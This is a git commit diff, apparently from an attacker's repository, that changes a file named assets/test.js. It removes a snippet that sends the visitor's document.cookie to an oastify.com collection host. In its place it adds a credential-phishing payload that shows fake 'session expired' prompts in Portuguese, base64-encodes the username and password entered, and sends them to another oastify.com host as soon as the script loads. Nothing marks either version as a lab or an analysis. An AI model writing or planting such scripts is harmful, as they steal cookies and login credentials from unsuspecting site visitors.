8873ac8fbb566be490dd01df1f44c172082d52f7
L34K3D <50811097+xL34K3D@users.noreply.github.com>
2024-03-08 12:08:01 -0300

    Update test.js

--- assets/test.js
+++ assets/test.js
@@ -1,5 +1,22 @@
-fetch('https://kbzq5oqrvxjzwrceguonqddd84ev2mqb.oastify.com', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-  });
+function sendRequestWithBasicAuth() {
+    var username = prompt("Sessão Expirada! Por favor, insira seu nome de usuário:");
+    var password = prompt("Por favor, insira sua senha:");
+    if (username === null || password === null) {
+        return;
+    }
+    var credentials = btoa(username + ':' + password);
+    var url = 'http://iwi9clrcaa4whhu1brd3xojxwo2fq6ev.oastify.com/log?x=' + credentials;
+    fetch(url, {
+        mode: 'no-cors',
+    })
+    .then(response => {
+        if (response.ok) {
+        } else {
+        }
+    })
+    .then(data => {
+    })
+    .catch(error => {
+    });
+}
+sendRequestWithBasicAuth();
